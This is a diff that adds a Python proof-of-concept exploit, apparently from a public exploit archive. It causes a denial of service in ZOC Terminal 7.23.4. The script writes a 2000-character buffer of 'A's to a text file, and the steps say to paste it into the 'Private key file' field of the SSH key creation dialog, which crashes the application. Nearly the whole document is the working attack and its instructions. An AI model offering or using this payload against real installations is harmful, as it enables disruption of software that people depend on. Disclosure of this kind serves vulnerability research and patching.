@@ -1,0 +1,22 @@
+#Exploit Title:  ZOC Terminal v7.23.4  - 'Private key file' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-15
+#Vendor Homepage: https://www.emtec.com
+#Software Link: http://www.emtec.com/downloads/zoc/zoc7234_x64.exe
+#Tested Version: 7.23.4
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: ZOC_Terminal_pkf.py
+#2.- Open zoc_pkf.txt and copy content to clipboard
+#3.- Open ZOC Terminal
+#4.- Select File > Create SSH Key Files... 
+#5.- Select "Private key file:" field erease and Paste ClipBoard 
+#6.- Click on "Create public/private key files..."
+#7.- Crashed
+
+cod = "\x41" * 2000
+
+f = open('zoc_pkf.txt', 'w')
+f.write(cod)
+f.close()
